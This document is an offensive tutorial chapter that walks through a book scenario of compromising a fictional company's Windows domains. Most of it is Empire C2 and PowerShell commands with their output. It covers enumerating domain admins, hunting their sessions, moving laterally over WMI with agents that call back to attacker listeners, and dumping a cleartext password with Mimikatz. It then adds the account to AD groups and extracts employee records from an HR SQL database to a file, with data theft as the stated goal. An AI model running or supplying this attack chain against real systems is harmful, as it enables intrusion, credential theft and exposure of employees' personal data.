# Domain and Database Exploitation

*Note: this section continues from the previous cookbook on Mainframe Exploitation via FTP Bouncing and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 106)*

Here is a short summarization of steps covered by the book:

In the last chapter, we took advantage of a backup account listed on both domains GBSALES and GBSHOP. This is a trick we can perform again on a number of other domains: GBRD, GBCORP, etc. However, it seems GBHR, the HR domain, does not have such an account. Fortunate blunder by an admin, or genuine hardening measure? Who can tell... in any case, we will pursue a different approach for this domain: hunting sysadmins.

We have total control over a few machines in different domains already. Therefore, we can dump clear text passwords of recently connected users on almost all of these machines, turning them into real booby traps should someone connect to any of them.

Here's the output showing all active agents on Empire:

```
Empire: salesFTP) > agents
[*] Active agents:
 Name      Internal IP   Machine Name  Username
 wkAgent   192.168.1.25  WK0025        *WL0025_wk_admin
 DvAgent   192.168.1.2   WK0025        GBSHOP\user
 Dcshop    10.10.20.199  SV0199        *GBSHOP\rachel_adm
 salesFTP  10.30.30.210  SL0210        *GBSALES\sysback
```

It is only a matter of time before a GBHR user, scheduled task, or service account connects to one of these booby traps, leaving their credentials behind in memory! Using our agent on the GBSALES domain, we start by listing domain admins in GBHR:

```
(Empire: salesFTP) > usemodule situational_awareness/network/powerview/get_user
(Empire: get_user) > set Filter adminCount=1
(Empire: get_user) > set Domain GBHR.CORP
(Empire: get_user) > execute
Job started: Debug32_qa90a
distinguishedname : CN=Administrator,CN=Users,DC=GBHR,DC=CORP
name              : Administrator
objectsid         : S-1-5-21-1930387874-2808181134-500
admincount        : 1

distinguishedname : CN=svc_ps,CN=Users,DC=GBHR,DC=CORP
name              : svc_ps
objectsid         : S-1-5-21-1930387874-2808181134-2001
admincount        : 1

distinguishedname : CN=erica_a,CN=Users,DC=GBHR,DC=CORP
name              : erica_a
objectsid         : S-1-5-21-1930387874-2808181134-2030
admincount        : 1
```

The principle is quite simple: we continuously crosscheck this list against currently active users on different GBSALES and GBSHOP servers – more than 400 machines. If we spot one of the GBHR admins on a given machine, we connect to it, dump clear text passwords using Mimikatz, etc. If we are not lucky (sometimes there is little activity going on), we try again in a few hours. It is only logical, after all, that at some point in time an HR admin account will fetch a GBSHOP or GBSALES resource. Why bother setting up a bidirectional trust in the first place otherwise?

```
Empire: salesFTP) > usemodule situational_awareness/network/powerview/user_hunter
(Empire: user_hunter) > execute
```

Note: *the primary goal of the user_hunter module is to identify the locations of specific domain users across the network. This is particularly useful for tracking down high-value targets like domain admins or service accounts. The module scans Active Directory and checks the sessions on various machines to see where a specified user is currently logged in or has an active session. It helps attackers (or penetration testers) identify where privileged accounts (e.g., domain admins) are logged in. This is crucial for lateral movement and privilege escalation. By frequently running this module, one can monitor the presence of specific users across the network, making it easier to plan subsequent attacks.*

A portion of this output has been omitted, but the part we are interested in goes like this:

```
UserDomain  : GBHR
UserName    : svc_ps
ComputerName: SL0213.GBSALES.CORP
IPAddress   : 10.30.30.213
```

There seems to be interesting activity on server SL0213 belonging to the GBSALES domain. We move to that server by spawning a remote Empire agent using WMI:

```
(Empire: salesFTP) > usemodule lateral_movement/invoke_wmi
(Empire: invoke_wmi) > set Listener FrontGun_List
(Empire: invoke_wmi) > set ComputerName SL0213.GBSALES.CORP
(Empire: invoke_wmi) > run
[+] Initial agent BHNS2HZGPF43TDRX from 10.30.30.213 now active
(Empire: invoke_wmi) > interact BHNS2HZGPF43TDRX
(Empire: BHNS2HZGPF43TDRX) > rename SL0213
(Empire: SL0213) >
```

Once the agent is active, we unleash Mimikatz to extract credentials:

```
(Empire: SL0213) > mimikatz
Job started: Debug32_md6ll
```

The relevant output reveals:

```
* Username : GBHR\svc_ps
* Domain   : GBHR
* Password : Sheldon*01
```

With a domain admin account in hand, we can now search for employee data. Although we can gather some information by looking for shares using the share_finder module, the real source is likely in a structured database.

We position an agent on one of the HR servers using WMI for lateral movement:

```
(Empire: salesFTP) > usemodule lateral_movement/invoke_wmi
(Empire: invoke_wmi) > set Listener AttackSrv_List
(Empire: invoke_wmi) > set UserName GHBR\svc_ps
(Empire: invoke_wmi) > set Password Sheldon*01
(Empire: invoke_wmi) > set ComputerName SR0011.GBHR.CORP
(Empire: invoke_wmi) > run
[+] Initial agent VJAKEHA86D9AJDAG from 10.40.40.11 now active
(Empire: invoke_wmi) > interact VJAKEHA86D9AJDAG
(Empire: VJAKEHA86D9AJDAG) > rename HRAgent
(Empire: HRAgent) >
```

A simple query looking for the keyword “HR” in a server’s description returns several promising results:

```
(Empire: HRAgent) > usemodule situational_awareness/network/powerview/get_computer
(Empire: get_computer) > set Filter description=*HR*
(Empire: get_computer) > set FullData True
(Empire: get_computer) > run
Logoncount       : 441
Badpasswordtime  : 1/1/1601 1:00:00 AM
Description      : Master HR database
Objectclass      : CN=SR0040,CN=Computers,DC=GBHR,DC=CORP
Lastlogontimestamp : 3/26/2017 5:52:17 PM
Name             : SR0040
```

Note: *the usemodule situational_awareness/network/powerview/get_computer module in Empire is a part of PowerView, a PowerShell tool designed for gaining situational awareness within Windows Active Directory environments. The get_computer module is used to gather information about computer objects within an Active Directory domain. It queries Active Directory for information on computer objects, which includes various details such as computer names, descriptions, last logon timestamps, and more. You can apply filters to narrow down the search results based on specific attributes like descriptions, organizational units, or any other LDAP properties. With the FullData option enabled, it provides comprehensive details about each computer object.*

To our delight, admins tend to use meaningful server names and descriptions, making our job easier. The HR database is obviously on SR0040.GBHR.CORP. Since it is hosted on a Windows server, it is likely running on Microsoft SQL Server. However, we should confirm this hypothesis.

A quick port scan on the usual SQL ports (1521 for Oracle, 3306 for MySQL, and 1433 for SQL Server) should confirm this. Although, it is worth noting that SQL Server ports tend to be dynamically chosen after the 2008 version.

```
(Empire: HRAgent) > usemodule situational_awareness/network/portscan
(Empire: portscan) > set Ports {1433, 1521, 3306}
(Empire: portscan) > set Hosts SR0040.GBHR.CORP
(Empire: portscan) > run
Job started: Debug32_0plza

Hostname             : SR0040.GBHR.CORP
OpenPorts            : 1433
```

This scan confirms that port 1433, commonly used by Microsoft SQL Server, is open on the SR0040.GBHR.CORP host.

Just a quick summary of the key steps so far:

- Used backup accounts on GBSALES and GBSHOP domains to gain initial foothold. Established control over several machines in different domains.

- Deployed agents on various machines to monitor for connections from high-value accounts. Dumped clear text passwords of recently connected users to trap sysadmins and privileged accounts.

- Listed domain admins in the GBHR domain using the get_user module. Filtered results to identify users with adminCount=1.

- Crosschecked active sessions using the user_hunter module to track the presence of high-value accounts across the network. Found activity from a GBHR admin on a specific machine (SL0213).

- Spawned a remote Empire agent on SL0213 using WMI. Renamed the active agent for easier identification.

- Ran Mimikatz on the target machine to dump credentials. Extracted the password for the svc_ps account.

- Deployed another remote agent on an HR server (SR0011) using the obtained credentials. Renamed the new agent for easier identification.

- Used the get_computer module to find servers with descriptions containing "HR". Identified SR0040 as the master HR database server.

- Ran a port scan to confirm that SQL Server (port 1433) is running on the identified HR database server (SR0040).

And now we are ready to go back to the task at hand!

SQL Server databases are usually linked to the Windows domain, meaning if you control the domain, you control the databases. With a domain admin account, theoretically nothing is out of reach. However, some SQL databases restrict access to specific security groups. To bypass this, we can add your admin account (svc_ps) to the necessary Active Directory group.

Note: *to add the svc_ps account to a specific Active Directory group, you can use the Add-DomainGroupMember module in PowerView or directly use PowerShell commands. Here’s how you can do it using both methods:*

```
(Empire: HRAgent) > usemodule situational_awareness/powerview/add_domain_group_member
(Empire: add_domain_group_member) > set GroupName "YourTargetGroup"
(Empire: add_domain_group_member) > set Members "svc_ps"
(Empire: add_domain_group_member) > run
```

Another method using a PowerShell session:

```
# Ensure you have the necessary privileges
Add-ADGroupMember -Identity "YourTargetGroup" -Members "svc_ps"
```

To interact with the HR database, we load a PowerShell module into the Empire agent to issue SQL commands:

```
(Empire: HRAgent) > scriptimport /root/Invoke-SqlCommand.ps1
script successfully saved in memory
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "master" -Query "SELECT @@version"
Job Started: Debug32_aja7w
RunspaceId: ebe22441-f98b-44f7-9533-4c802821a2c5
Column1 : Microsoft SQL Server 2008 (RTM) – 10.0.1600.22 (X64)
Jul 9 2008 14:17:44
Copyright (c) 1988-2008 Microsoft Corporation
Express Edition (64-bit) on Windows NT 6.2 <X64>
```

Note: *Invoke-SqlCommand.ps1 is an additional tool beyond Empire's built-in modules, and you must explicitly import it to use it.*

*Apparently it can be sourced from here:* <https://github.com/Erich-Stehr/PowerShell.Profile/blob/master/Invoke-SqlCommand.ps1>

Some notable points:

- In-Memory Script: Invoke-SqlCommand.ps1 was loaded into memory, avoiding disk writes.

- Default Database: Accessed the master database as a starting point, but others like tempdb could also be used.

- SQL Server Version: Identified as SQL Server 2008.

- Credential Forwarding: Domain admin credentials automatically forwarded by Windows provided access without additional login.

Next, we use SQL query ```"SELECT is_srvrolemember('sysadmin')"``` to confirm admin privileges:

```
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "master" -Query "SELECT is_srvrolemember('sysadmin')"
```

The output ```Column1 : 1``` indicates full privileges.

Next, we query ```"SELECT name FROM master.dbo.sysdatabases"``` to get the list of databases. Since the output might be lengthy and contain multiple columns, we need to convert the result to a string format for easier viewing through the Empire agent. This is achieved by appending | out-string to the query:

```
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "master" -Query "SELECT name FROM master.dbo.sysdatabases" | out-string
```

This command will display the names of the databases in a string format. Example output:

```
Job started: Debug32_ie9lg
name
----
master
tempdb
model
msdb
[...]
HR_master
[...]
```

Note: *here is a very useful collection of SQL queries useful in a pentest:* <https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>

HR_master appears to be the most reasonable choice. To locate tables containing relevant information such as employee data, we perform a search using a wildcard character (%) to match any table names that include the keyword employee.

SQL query:

```
SELECT table_name 
FROM hr_master.information_schema.tables 
WHERE table_type = 'base table' 
AND table_name LIKE '%employee%'
```

Empire command:

```
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "HR_master" -Query "SELECT table_name FROM hr_master.INFORMATION_SCHEMA.TABLES WHERE table_type = 'base table' AND table_name LIKE '%employee%'" | out-string
Job started: Debug32_azd0k
table_name
-----------------------
HR_Employee_DE_Full
HR_Employee_wages_ref
HR_Employee_raise
HR_Employee_eval
HR_Employee_perf
[...]
```

Before dumping an entire table, it’s wise to understand the structure and content of the table. Here, we query the Employee_GB_Full table to inspect its columns and sample data.

```
SELECT * FROM hr_master..Employee_GB_Full
```

Empire command:

```
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "HR_master" -Query "SELECT * FROM hr_master..Employee_GB_Full" | out-string
Job started: Debug32_azd0k
empno     : 166
ename     : SCHMIDT
job       : DESIGNER
mgr       : 6
hiredate  : 12/17/2016 12:00:00 AM
```

To save the output of the SQL query to a file for later analysis, we append the Out-File PowerShell command. This ensures that the data is written to a specified file without altering or deleting any existing content:

```
(Empire: HRAgent) > scriptcmd Invoke-SqlCommand -Server "10.40.40.40" -Database "HR_master" -Query "SELECT * FROM hr_master..Employee_GB_Full" | Out-File -Append C:\users\svc_ps\appdata\local\out.txt
```

Just a quick summary regarding the last section:

- We search for tables in the HR_master database containing the keyword employee to quickly find the tables that are likely to hold the data we are interested in. This helps in cutting through the potential haystack of tables without having to manually inspect each one.

- Using the provided SQL query, we execute it through the Empire agent to list all tables whose names include the keyword employee. The search returns tables such as HR_Employee_DE_Full, HR_Employee_wages_ref, HR_Employee_raise, HR_Employee_eval, and HR_Employee_perf.

- Before dumping large amounts of data, we inspect the structure and sample data of a specific table, Employee_GB_Full, to understand its columns and the kind of data it contains. This step ensures we know exactly what kind of information we are dealing with. By querying the Employee_GB_Full table, we get a clear view of its structure and some sample data. This is crucial for identifying the exact information we want to extract later.

- Finally, to preserve the extracted data, we use the Out-File command in PowerShell. This command appends the query results to a specified file, allowing for organized and persistent data storage which can be reviewed or used for further analysis.

Note: We will discuss safe data exfiltration techniques in the following cookbooks.
